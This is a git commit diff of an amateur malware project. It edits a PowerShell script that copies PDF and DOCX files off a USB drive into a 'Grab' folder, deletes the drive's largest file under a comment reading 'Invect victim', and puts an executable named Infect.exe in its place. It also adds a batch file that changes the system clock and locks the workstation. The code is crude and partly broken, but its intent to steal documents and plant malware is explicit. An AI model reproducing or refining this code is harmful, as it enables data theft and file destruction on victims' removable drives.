4619509c69cf0b79262dc5ba1d35ace0249a0325
alphaO4 <48568909+alphaO4@users.noreply.github.com>
2020-07-15 20:14:21 +0200

    added Deleter and some other things

--- Scripts/downloader from usb.ps1
+++ Scripts/downloader from usb.ps1
@@ -1,9 +1,9 @@
 $output = "%User%\Desktop\Grab"
 $input = "D:\*.pdf,*.docx"
-$inputv = "%User%\Desktop\V\Test.bat"
+$inputv = "%User%\Desktop\V\Infect.exe"
 Copy-Item -path $input -destination $output
 #Invect victim
 $sise = "(gci -path "D:\" -r | sort Length -desc | select fullname -f 1)"
 $size = "D:\$sise"
 Remove-Item -path $size
-Copy-Item -path $inputv -destination $size.ps1
+Copy-Item -path $inputv -destination $size
---
+++ Scripts/timer.bat
@@ -0,0 +1,4 @@
+@echo off
+time 07:00
+rundll32.exe user32.dll, LockWorkStation
+exit
